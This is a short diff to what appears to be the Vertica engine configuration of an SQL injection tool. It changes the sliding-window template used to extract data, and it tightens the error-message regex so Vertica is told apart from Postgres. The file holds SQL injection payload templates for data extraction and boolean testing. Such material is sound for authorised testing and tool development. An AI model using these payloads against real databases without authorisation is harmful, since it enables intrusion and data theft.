@@ -101,18 +101,16 @@ strategy:
  configuration:
   slidingWindow: |
    select
-       /**
-        * If reach end of string (${lead}i) then NULLIF nullifies the result
-        */
        '${lead}'
-       || nullif(
+       || coalesce(
            substr(
                (${injection}),
                ${window.char},
                65536
            ),
-           '${trail_sql}'
+           ''
        )
+       || '${trail_sql}'
   limit: limit 1 offset ${limit.value}
   failsafe: cast((1337${indice}7330%2b1) as varchar)
   calibrator: repeat('${calibrator_sql}', 1024)
@@ -122,8 +120,7 @@ strategy:
    errorMessage:
     - vertica
    orderByErrorMessage:
-    # Collision with postgres
-    - (?!.*Vertica)ORDER BY position 1337 is not in select list
+    - Vertica.*VJDBC.*ORDER BY position 1337 is not in select list.*SQL State.*DB Errorcode
    # binary & to fix collision with virtuoso
    engineSpecific: "'a' = case when ${test} then 'a' else URI_PERCENT_ENCODE('') || (1 & 1) end"
 
